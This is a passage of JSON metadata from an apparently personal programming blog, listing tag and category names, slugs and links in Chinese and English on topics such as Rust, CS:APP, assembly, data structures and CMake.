system","slug":"file-system","link":"/tags/file-system/"},{"name":"CS:APP","slug":"CS-APP","link":"/tags/CS-APP/"},{"name":"CI&#x2F;CD","slug":"CI-CD","link":"/tags/CI-CD/"},{"name":"gitpages","slug":"gitpages","link":"/tags/gitpages/"},{"name":"clash","slug":"clash","link":"/tags/clash/"},{"name":"代理","slug":"代理","link":"/tags/%E4%BB%A3%E7%90%86/"},{"name":"数据清洗","slug":"数据清洗","link":"/tags/%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97/"},{"name":"XML","slug":"XML","link":"/tags/XML/"},{"name":"rust","slug":"rust","link":"/tags/rust/"},{"name":"智能指针","slug":"智能指针","link":"/tags/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"},{"name":"tensorflow-gpu","slug":"tensorflow-gpu","link":"/tags/tensorflow-gpu/"},{"name":"串匹配","slug":"串匹配","link":"/tags/%E4%B8%B2%E5%8C%B9%E9%85%8D/"},{"name":"数据结构","slug":"数据结构","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"迷宫问题","slug":"迷宫问题","link":"/tags/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/"},{"name":"新年","slug":"新年","link":"/tags/%E6%96%B0%E5%B9%B4/"},{"name":"variance","slug":"variance","link":"/tags/variance/"},{"name":"subtype","slug":"subtype","link":"/tags/subtype/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"二进制炸弹","slug":"二进制炸弹","link":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9/"},{"name":"CMake","slug":"CMake","link":"/tags/CMake/"}],"categories":[{"name":"面经","slug":"面经","link":"/categories/%E9%9D%A2%E7%BB%8F/"},{"name":"OS","slug":"OS","link":"/categories/OS/"},{"name":"CS:APP","slug":"CS-APP","link":"/categories/CS-APP/"},{"name":"github","slug":"github","link":"/categories/github/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"rust","slug":"rust","link":"/categories/rust/"},{"name":"数据结构","slug":"数据结构","link":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"感想","slug":"感想","link":"/categories/%E6%84%9F%E6%83%B3/"},{"name":"构建工具","slug":"构建工具","link":"/categories/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"}]}